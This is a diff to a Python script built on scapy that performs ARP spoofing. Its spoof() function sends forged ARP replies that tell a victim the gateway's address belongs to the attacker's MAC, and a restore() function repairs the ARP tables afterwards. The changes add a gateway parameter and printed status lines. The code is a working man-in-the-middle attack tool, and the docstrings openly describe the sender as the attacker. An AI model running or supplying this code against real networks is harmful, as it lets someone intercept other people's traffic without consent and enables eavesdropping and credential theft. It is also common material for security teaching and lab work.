@@ -32,13 +32,15 @@ def get_mac(ip):
         print("\n No MAC address found.")
         return None
 
-def spoof(victim_ip, target):
+def spoof(victim_ip, gateway, output):
     """
     Spoofs the ARP table of the victim
-    As the result, target MAC address will be changed to the attacker's MAC address
+    As the result, target MAC address will be changed to our MAC address
     Step 1: Get the MAC address of the victim
     Step 2: Creating an ARP packet from target to victim
-    Note: op=2 means that ARP is going to send answer
+    Note: op=2 means that the ARP packet is a response
+    Note: There is no need to specify 'hwsrc', since by default, it is the MAC
+    address of the sender (us as the attacker).
     Step 3: Send the packet created without output
     """
     
@@ -46,19 +48,27 @@ def spoof(victim_ip, target):
     victim_mac = get_mac(victim_ip)
 
     # Step 2
-    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=target)
+    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway)
     
     # Step 3
     scapy.send(packet, verbose=False)
 
-def restore(dest_ip, source_ip):
+    if output:
+        attacker_mac = scapy.ARP().hwsrc
+        print(f"[+] Sent to {victim_ip} : {gateway} is at {attacker_mac}")
+
+def restore(dest_ip, source_ip, output):
     """
     Restores ARP tables to their correct state
-    Note: The correction packet will be sent 4 times to ensure host is received
+    Note: The correction packet will be sent 5 times to ensure host has received 
+    the correction
     """
 
     dest_mac = get_mac(dest_ip)
     source_mac = get_mac(source_ip)
     packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, count=4, verbose=False)
+    scapy.send(packet, count=5, verbose=False)
+
+    if output:
+        print(f"[+] Sent to {dest_ip}: {source_ip} is at {source_mac}")
     
